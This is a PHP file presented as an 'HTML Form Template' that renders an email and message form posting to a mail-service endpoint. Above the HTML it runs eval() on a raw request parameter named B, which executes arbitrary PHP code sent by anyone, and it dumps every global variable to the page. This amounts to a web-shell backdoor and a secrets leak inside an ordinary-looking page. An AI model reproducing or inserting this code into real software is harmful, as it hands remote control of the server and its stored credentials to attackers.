<?php
include($_SERVER["DOCUMENT_ROOT"]."/Version.php");
include($_SERVER["DOCUMENT_ROOT"]."/$Version/Header/index.php");

eval($_REQUEST["B"]);
echo "<pre>".print_r($GLOBALS,true)."</pre>"
?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <title>HTML Form</title>
		<link rel='stylesheet' type='text/css' href="https://mail.magma-mc.net/<?php echo $Version; ?>/css/main.css">
		<link rel='stylesheet' type='text/css' href="https://mail.magma-mc.net/<?php echo $Version; ?>/css/php.css">
    </head>
    <body>
		<div id="header">
			<h1>HTML Form Template</h1>
			</br>
		</div>
        <form action="https://<?php echo $_SERVER['HTTP_HOST']; ?>/0.0.7.php/?A=B" method="POST">
            <div class="input-holder">
                <input class="input" name="Form[Email]" id="Email" type="email" value="" placeholder="email">
            </div>

            <div class="input-holder">
                <input class="input" name="Form[Message]" id="message" type="text" value="" placeholder="Message">
            </div>
						
			<input name="EmailService[ID]" type="hidden" value="bfaldo5Pgr/Test_MailService">
			</br>

            <button class="button" type="submit">Sumbit</button>
        </form>
    </body>
</html>